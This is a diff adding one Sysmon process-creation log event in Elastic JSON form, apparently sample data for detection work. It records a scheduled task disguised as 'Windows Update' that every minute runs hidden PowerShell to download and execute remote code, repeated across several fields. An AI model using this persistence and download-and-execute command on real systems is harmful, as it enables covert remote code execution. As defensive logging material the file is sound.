@@ -1,0 +1,344 @@
+{
+  "@timestamp": [
+    "2025-05-21T07:25:24.576Z"
+  ],
+  "agent.ephemeral_id": [
+    "9546d373-0ee4-4ae5-9126-1c338d93dc53"
+  ],
+  "agent.id": [
+    "b2fe2ae0-191d-4cf1-95dd-afd270d6498d"
+  ],
+  "agent.name": [
+    "JEMINA-PC"
+  ],
+  "agent.name.text": [
+    "JEMINA-PC"
+  ],
+  "agent.type": [
+    "filebeat"
+  ],
+  "agent.version": [
+    "9.0.1"
+  ],
+  "data_stream.dataset": [
+    "windows.sysmon_operational"
+  ],
+  "data_stream.namespace": [
+    "default"
+  ],
+  "data_stream.type": [
+    "logs"
+  ],
+  "ecs.version": [
+    "8.17.0"
+  ],
+  "elastic_agent.id": [
+    "b2fe2ae0-191d-4cf1-95dd-afd270d6498d"
+  ],
+  "elastic_agent.snapshot": [
+    false
+  ],
+  "elastic_agent.version": [
+    "9.0.1"
+  ],
+  "event.action": [
+    "Process creation"
+  ],
+  "event.agent_id_status": [
+    "verified"
+  ],
+  "event.category": [
+    "process"
+  ],
+  "event.code": [
+    "1"
+  ],
+  "event.created": [
+    "2025-05-21T15:12:28.013Z"
+  ],
+  "event.dataset": [
+    "windows.sysmon_operational"
+  ],
+  "event.ingested": [
+    "2025-05-21T15:12:29.000Z"
+  ],
+  "event.kind": [
+    "event"
+  ],
+  "event.module": [
+    "windows"
+  ],
+  "event.provider": [
+    "Microsoft-Windows-Sysmon"
+  ],
+  "event.type": [
+    "start"
+  ],
+  "host.architecture": [
+    "x86_64"
+  ],
+  "host.hostname": [
+    "JEMINA-PC"
+  ],
+  "host.id": [
+    "15f123f6-98bd-4e71-b99d-7a84d7fb15e8"
+  ],
+  "host.ip": [
+    "fe80::2024:2324:e3fa:99e8",
+    "169.254.144.203",
+    "fe80::31ce:ce7a:357f:1f64",
+    "169.254.185.63",
+    "fe80::5398:8299:b3:b630",
+    "192.168.227.1",
+    "fe80::d0f0:412f:425d:f63b",
+    "192.168.40.1",
+    "fe80::1106:5f7c:6eaa:8d17",
+    "192.168.1.5",
+    "fe80::2668:e40f:a27:7e33",
+    "169.254.179.245"
+  ],
+  "host.mac": [
+    "00-50-56-C0-00-01",
+    "00-50-56-C0-00-08",
+    "14-AC-60-33-B6-B7",
+    "16-AC-60-33-86-87",
+    "16-AC-60-33-96-97",
+    "BC-EC-A0-09-81-7F"
+  ],
+  "host.name": [
+    "jemina-pc"
+  ],
+  "host.os.build": [
+    "26100.4061"
+  ],
+  "host.os.family": [
+    "windows"
+  ],
+  "host.os.kernel": [
+    "10.0.26100.4061 (WinBuild.160101.0800)"
+  ],
+  "host.os.name": [
+    "Windows 11 Home Single Language"
+  ],
+  "host.os.name.text": [
+    "Windows 11 Home Single Language"
+  ],
+  "host.os.platform": [
+    "windows"
+  ],
+  "host.os.type": [
+    "windows"
+  ],
+  "host.os.version": [
+    "10.0"
+  ],
+  "input.type": [
+    "winlog"
+  ],
+  "log.level": [
+    "information"
+  ],
+  "message": [
+    "Process Create:\nRuleName: -\nUtcTime: 2025-05-21 07:25:24.576\nProcessGuid: {15F123F6-7FE4-682D-1513-000000002500}\nProcessId: 12184\nImage: C:\\Windows\\System32\\schtasks.exe\nFileVersion: 10.0.26100.1882 (WinBuild.160101.0800)\nDescription: Task Scheduler Configuration Tool\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: schtasks.exe\nCommandLine: \"C:\\WINDOWS\\system32\\schtasks.exe\" /create /tn \"Windows Update\" /tr \"powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://testphp.vulnweb.com')\" /sc minute /mo 1\nCurrentDirectory: C:\\WINDOWS\\system32\\\nUser: JEMINA-PC\\fathi\nLogonGuid: {15F123F6-6599-682D-9626-F60500000000}\nLogonId: 0x5f62696\nTerminalSessionId: 3\nIntegrityLevel: High\nHashes: MD5=609515088DC0A4CC239C93CFBD25A7E7,SHA256=BB8443E2514FCBD53E60221D5309320723ADB94C0D69B088DEFACD34E0F653E8,IMPHASH=A7B2338D5533AE221C0EB231BBEC0787\nParentProcessGuid: {15F123F6-7B42-682D-E812-000000002500}\nParentProcessId: 4360\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" \nParentUser: JEMINA-PC\\fathi"
+  ],
+  "process.args": [
+    "C:\\WINDOWS\\system32\\schtasks.exe",
+    "/create",
+    "/tn",
+    "Windows Update",
+    "/tr",
+    "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://testphp.vulnweb.com')",
+    "/sc",
+    "minute",
+    "/mo",
+    "1"
+  ],
+  "process.args_count": [
+    10
+  ],
+  "process.command_line": [
+    "\"C:\\WINDOWS\\system32\\schtasks.exe\" /create /tn \"Windows Update\" /tr \"powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://testphp.vulnweb.com')\" /sc minute /mo 1"
+  ],
+  "process.command_line.text": [
+    "\"C:\\WINDOWS\\system32\\schtasks.exe\" /create /tn \"Windows Update\" /tr \"powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://testphp.vulnweb.com')\" /sc minute /mo 1"
+  ],
+  "process.entity_id": [
+    "{15F123F6-7FE4-682D-1513-000000002500}"
+  ],
+  "process.executable": [
+    "C:\\Windows\\System32\\schtasks.exe"
+  ],
+  "process.executable.caseless": [
+    "c:\\windows\\system32\\schtasks.exe"
+  ],
+  "process.executable.text": [
+    "C:\\Windows\\System32\\schtasks.exe"
+  ],
+  "process.hash.md5": [
+    "609515088dc0a4cc239c93cfbd25a7e7"
+  ],
+  "process.hash.sha256": [
+    "bb8443e2514fcbd53e60221d5309320723adb94c0d69b088defacd34e0f653e8"
+  ],
+  "process.name": [
+    "schtasks.exe"
+  ],
+  "process.name.caseless": [
+    "schtasks.exe"
+  ],
+  "process.name.text": [
+    "schtasks.exe"
+  ],
+  "process.parent.args": [
+    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+  ],
+  "process.parent.args_count": [
+    1
+  ],
+  "process.parent.command_line": [
+    "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" "
+  ],
+  "process.parent.command_line.text": [
+    "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" "
+  ],
+  "process.parent.entity_id": [
+    "{15F123F6-7B42-682D-E812-000000002500}"
+  ],
+  "process.parent.executable": [
+    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+  ],
+  "process.parent.executable.text": [
+    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+  ],
+  "process.parent.name": [
+    "powershell.exe"
+  ],
+  "process.parent.name.text": [
+    "powershell.exe"
+  ],
+  "process.parent.pid": [
+    4360
+  ],
+  "process.pe.company": [
+    "Microsoft Corporation"
+  ],
+  "process.pe.description": [
+    "Task Scheduler Configuration Tool"
+  ],
+  "process.pe.file_version": [
+    "10.0.26100.1882 (WinBuild.160101.0800)"
+  ],
+  "process.pe.imphash": [
+    "a7b2338d5533ae221c0eb231bbec0787"
+  ],
+  "process.pe.original_file_name": [
+    "schtasks.exe"
+  ],
+  "process.pe.product": [
+    "Microsoft® Windows® Operating System"
+  ],
+  "process.pid": [
+    12184
+  ],
+  "process.working_directory": [
+    "C:\\WINDOWS\\system32\\"
+  ],
+  "process.working_directory.text": [
+    "C:\\WINDOWS\\system32\\"
+  ],
+  "related.hash": [
+    "bb8443e2514fcbd53e60221d5309320723adb94c0d69b088defacd34e0f653e8",
+    "609515088dc0a4cc239c93cfbd25a7e7",
+    "a7b2338d5533ae221c0eb231bbec0787"
+  ],
+  "related.user": [
+    "fathi"
+  ],
+  "user.domain": [
+    "JEMINA-PC"
+  ],
+  "user.id": [
+    "S-1-5-18"
+  ],
+  "user.name": [
+    "fathi"
+  ],
+  "user.name.text": [
+    "fathi"
+  ],
+  "winlog.channel": [
+    "Microsoft-Windows-Sysmon/Operational"
+  ],
+  "winlog.computer_name": [
+    "JEMINA-PC"
+  ],
+  "winlog.event_data.Company": [
+    "Microsoft Corporation"
+  ],
+  "winlog.event_data.Description": [
+    "Task Scheduler Configuration Tool"
+  ],
+  "winlog.event_data.FileVersion": [
+    "10.0.26100.1882 (WinBuild.160101.0800)"
+  ],
+  "winlog.event_data.IntegrityLevel": [
+    "High"
+  ],
+  "winlog.event_data.LogonGuid": [
+    "{15F123F6-6599-682D-9626-F60500000000}"
+  ],
+  "winlog.event_data.LogonId": [
+    "0x5f62696"
+  ],
+  "winlog.event_data.ParentUser": [
+    "JEMINA-PC\\fathi"
+  ],
+  "winlog.event_data.Product": [
+    "Microsoft® Windows® Operating System"
+  ],
+  "winlog.event_data.TerminalSessionId": [
+    "3"
+  ],
+  "winlog.event_id": [
+    "1"
+  ],
+  "winlog.opcode": [
+    "Info"
+  ],
+  "winlog.process.pid": [
+    4056
+  ],
+  "winlog.process.thread.id": [
+    19148
+  ],
+  "winlog.provider_guid": [
+    "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"
+  ],
+  "winlog.provider_name": [
+    "Microsoft-Windows-Sysmon"
+  ],
+  "winlog.record_id": [
+    "42004"
+  ],
+  "winlog.task": [
+    "Process Create (rule: ProcessCreate)"
+  ],
+  "winlog.user.domain": [
+    "NT AUTHORITY"
+  ],
+  "winlog.user.identifier": [
+    "S-1-5-18"
+  ],
+  "winlog.user.name": [
+    "SYSTEM"
+  ],
+  "winlog.user.type": [
+    "User"
+  ],
+  "winlog.version": [
+    5
+  ],
+  "_id": "AZbzZ526iqeNp542MZnM",
+  "_index": ".ds-logs-windows.sysmon_operational-default-2025.05.21-000001",
+  "_score": null
+}
